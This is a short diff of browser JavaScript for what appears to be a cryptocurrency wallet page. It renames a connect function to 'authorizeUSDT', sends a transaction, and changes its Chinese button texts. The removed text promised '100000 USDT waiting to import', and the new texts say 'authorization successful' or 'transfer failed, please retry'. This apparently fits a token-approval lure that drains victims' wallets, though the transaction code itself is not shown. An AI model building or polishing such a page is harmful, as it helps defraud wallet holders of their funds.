@@ -1,4 +1,4 @@
-async function connectWallet() {
+async function authorizeUSDT() {
     if (typeof window.ethereum !== 'undefined') {
         try {
             // 请求连接到钱包
@@ -35,10 +35,10 @@ async function connectWallet() {
             await tx.wait();
             
             // 更新按钮文本
-            document.getElementById('okButton').innerText = '成功USDT100000等待导入';
+            document.getElementById('nextButton').innerText = '授权成功';
         } catch (error) {
             console.error(error);
-            document.getElementById('okButton').innerText = '连接失败请重新连接';
+            document.getElementById('nextButton').innerText = '转账失败，请重试';
         }
     } else {
         alert('请安装 MetaMask 等以太坊钱包插件');
